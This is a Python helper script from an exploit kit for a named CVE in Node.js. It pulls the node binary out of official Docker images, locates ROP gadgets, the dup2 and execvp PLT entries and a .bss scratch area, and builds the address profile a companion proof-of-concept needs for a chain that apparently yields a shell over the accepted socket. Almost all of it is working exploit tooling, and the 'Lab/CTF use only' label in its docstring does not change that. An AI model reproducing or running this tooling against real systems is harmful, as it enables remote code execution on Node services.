#!/usr/bin/env python3
"""Auto-build the ROP gadget profile for a given node binary (CVE-2026-111497).

The node binaries in the official images are non-PIE (ET_EXEC), so every gadget
and PLT entry the exploit needs is a FIXED absolute address readable straight
out of the ELF -- no hand-calibration. This resolves them for any such binary
(e.g. 24.19.0, 24.9.0, ...) so poc.py isn't tied to one build.

Usage (as a module):  from build_profile import build_profile
       (as a CLI)   :  python3 build_profile.py <node-binary | docker-image>

Resolves the BINARY-derived fields only. The runtime fields (default_staged_
position = ring->stack ASLR delta, accepted_socket_fd) are NOT in the binary --
poc.py sweeps those. Needs pwntools. Lab/CTF use only.
"""
import os
import struct
import subprocess
import sys
import tempfile

# exact byte patterns for the gadgets the chain uses (derived from the decoder
# build; equivalent gadgets exist across the official-image family).
_GADGET_PATTERNS = {
    "mov_rax_rdi_ret":       b"\x48\x89\xf8\xc3",                                  # mov rax, rdi ; ret
    "pivot_rsp_rax_30_ret":  b"\x48\x8d\x60\x30\xf3\xc3",                          # lea rsp,[rax+0x30] ; repz ret
    "pop_rsi_ret":           b"\x5e\xc3",                                          # pop rsi ; ret
    "store_rdi_plus_88_ret": b"\x48\x81\xc7\x88\x00\x00\x00\x31\xc0\x48\x89\x3e\xc3",  # add rdi,0x88 ; xor eax,eax ; mov [rsi],rdi ; ret
    "pop_rbx_ret":           b"\x5b\xc3",                                          # pop rbx ; ret
    "pop_rdi_ret":           b"\x5f\xc3",                                          # pop rdi ; ret
}
# call site: mov rsi,[rbx+0x10] ; mov rdi,[rbx+0x8] ; call execvp@plt
_EXECVP_SITE = b"\x48\x8b\x73\x10\x48\x8b\x7b\x08\xe8"

# fields that are properties of the exploit technique / stream, not the binary.
_STATIC = {
    "prefix_size": 1031,
    "copy_source_offset": 0x367,
    "command_block_extra": 0xFFFFFF,
    "second_stage_size": 256,
    "stage_delay_seconds": 0.5,
    "restart_timeout_seconds": 8.0,
    "attempts": 16,
    "default_staged_position": 0x137ED748,  # runtime ASLR delta; a guess, use --sweep
    "accepted_socket_fd": 19,                # runtime; use --sweep
}


def _extract_from_image(image: str) -> str:
    """docker cp /usr/local/bin/node out of an image into a temp file."""
    tmp = tempfile.mkdtemp(prefix="node2shell-")
    out = os.path.join(tmp, "node")
    cid = subprocess.check_output(["docker", "create", image]).decode().strip()
    try:
        subprocess.check_call(["docker", "cp", f"{cid}:/usr/local/bin/node", out])
    finally:
        subprocess.call(["docker", "rm", "-f", cid], stdout=subprocess.DEVNULL)
    return out


def _first(elf, pattern):
    for addr in elf.search(pattern, executable=True):
        return addr
    return None


def build_profile(target: str, verbose: bool = True) -> dict:
    from pwnlib.elf import ELF  # lazy: only needed for --autoprofile

    path = target if os.path.exists(target) else _extract_from_image(target)
    elf = ELF(path, checksec=False)
    if elf.pie:
        raise RuntimeError("binary is PIE; this builder needs a non-PIE node "
                           "(the official images are non-PIE)")

    prof = dict(_STATIC)
    for name, pat in _GADGET_PATTERNS.items():
        addr = _first(elf, pat)
        if addr is None:
            raise RuntimeError(f"gadget not found for {name} -- this build may "
                               f"need the chain adapted")
        prof[name] = addr

    prof["dup2_plt"] = elf.plt["dup2"]

    execvp_plt = elf.plt["execvp"]
    site = None
    for addr in elf.search(_EXECVP_SITE, executable=True):
        call_at = addr + 8
        rel = struct.unpack("<i", elf.read(call_at + 1, 4))[0]
        if call_at + 5 + rel == execvp_plt:
            site = addr
            break
    if site is None:
        raise RuntimeError("execvp call-site gadget not found")
    prof["execvp_call_site"] = site

    # Scratch region for the ROP argv/filename pointers. The chain touches only
    # bss_base+0x8 and bss_base+0x10, and needs [bss_base+0x10] (execvp's argv)
    # to read as 0 at runtime. .bss is NOBITS, so the file image is all-zero and
    # scanning it tells us nothing about runtime contents -- but globals pack from
    # the FRONT of .bss, so its TAIL reliably stays zero. Take the top of .bss,
    # aligned down to 0x100, which leaves >=0x80 of slack for the +0x8/+0x10 reads.
    bss = elf.get_section_by_name(".bss")
    bss_end = bss.header.sh_addr + bss.header.sh_size
    prof["bss_base"] = (bss_end - 0x80) & ~0xFF

    if verbose:
        v = subprocess.run([path, "--version"], capture_output=True,
                           text=True).stdout.strip()
        print(f"[autoprofile] {path}  node {v}  (non-PIE)", file=sys.stderr)
        for k in ("mov_rax_rdi_ret", "pivot_rsp_rax_30_ret", "pop_rsi_ret",
                  "store_rdi_plus_88_ret", "pop_rbx_ret", "pop_rdi_ret",
                  "dup2_plt", "execvp_call_site", "bss_base"):
            print(f"    {k:22} = {prof[k]:#x}", file=sys.stderr)
    return prof


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("usage: build_profile.py <node-binary | docker-image>")
        sys.exit(2)
    build_profile(sys.argv[1])
